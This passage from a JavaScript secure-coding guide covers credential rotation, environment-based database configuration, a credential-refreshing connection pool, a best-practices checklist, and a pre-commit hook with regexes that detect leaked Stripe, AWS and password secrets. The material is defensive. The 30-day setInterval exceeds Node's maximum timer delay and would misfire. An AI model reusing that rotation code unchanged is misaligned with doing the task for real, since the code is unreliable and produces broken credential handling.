      this.previousKey = null;
    }, 24 * 60 * 60 * 1000); // 24 hour grace period
  }
  
  async validateKey(providedKey) {
    // Accept both current and previous key during grace period
    return providedKey === this.currentKey || 
           (this.previousKey && providedKey === this.previousKey);
  }
  
  async generateNewKey() {
    return crypto.randomBytes(32).toString('hex');
  }
  
  async updateSecretManager(newKey) {
    // Update in AWS Secrets Manager, etc.
    await secretsManager.updateSecret({
      SecretId: 'app/api-key',
      SecretString: newKey
    });
  }
}

// Scheduled rotation
const rotationManager = new CredentialRotationManager();

// Run rotation every 30 days
setInterval(() => {
  rotationManager.rotateCredentials();
}, 30 * 24 * 60 * 60 * 1000);
```

### Database Connection Strings

**Secure storage:**

```javascript
// Instead of hardcoding
// const connectionString = 'postgresql://user:password@localhost:5432/db';

// Use environment variable
const connectionString = process.env.DATABASE_URL;

// Or parse components separately
const dbConfig = {
  host: process.env.DB_HOST,
  port: process.env.DB_PORT,
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  ssl: {
    rejectUnauthorized: true,
    ca: fs.readFileSync(process.env.DB_SSL_CERT)
  }
};

const pool = new Pool(dbConfig);
```

**Connection pooling with credential refresh:**

```javascript
const { Pool } = require('pg');

class SecurePool {
  constructor() {
    this.pool = null;
    this.initializePool();
    
    // Refresh credentials periodically
    setInterval(() => this.refreshCredentials(), 3600000); // 1 hour
  }
  
  async initializePool() {
    const credentials = await this.getCredentials();
    
    this.pool = new Pool({
      host: credentials.host,
      database: credentials.database,
      user: credentials.username,
      password: credentials.password,
      max: 20,
      idleTimeoutMillis: 30000,
      connectionTimeoutMillis: 2000,
    });
  }
  
  async getCredentials() {
    // Fetch from secret manager
    return await secretsManager.getSecret('database/credentials');
  }
  
  async refreshCredentials() {
    await this.pool.end();
    await this.initializePool();
  }
  
  async query(text, params) {
    return this.pool.query(text, params);
  }
}

const db = new SecurePool();
```

### Security Best Practices Checklist

**Never do:**

- Store credentials in version control
- Hardcode secrets in source code
- Store passwords in plain text
- Use weak encryption algorithms (MD5, SHA1 for passwords)
- Share credentials in chat/email
- Log sensitive credentials
- Store credentials in client-side code
- Use the same credentials across environments
- Store API keys in public repositories

**Always do:**

- Use environment variables or secret managers
- Rotate credentials regularly
- Use strong hashing for passwords (bcrypt, Argon2)
- Implement proper access controls
- Use HTTPS for credential transmission
- Audit credential access
- Implement credential expiration
- Use different credentials per environment
- Monitor for credential leaks
- Have an incident response plan

**Credential leak detection:**

```javascript
// Add pre-commit hook to check for secrets
// .git/hooks/pre-commit

const fs = require('fs');
const { execSync } = require('child_process');

const patterns = [
  /sk_live_[a-zA-Z0-9]+/,  // Stripe live keys
  /sk_test_[a-zA-Z0-9]+/,  // Stripe test keys
  /AKIA[0-9A-Z]{16}/,      // AWS access key
  /password\s*=\s*['"][^'"]+['"]/i,
  /api[_-]?key\s*=\s*['"][^'"]+['"]/i
];

const stagedFiles = execSync('git diff --cached --name-only')
  .toString()
  .split('\n')
  .filter(Boolean);

for (const file of stagedFiles) {
  if (!fs.existsSync(file)) continue;
  
  const content = fs.readFileSync(file, 'utf8');
  
  for (const pattern of patterns) {
    if (pattern.test(content)) {
      console.error(`⚠️  Potential secret found in ${file}`);
      process.exit(1);
    }
  }
}
```

---

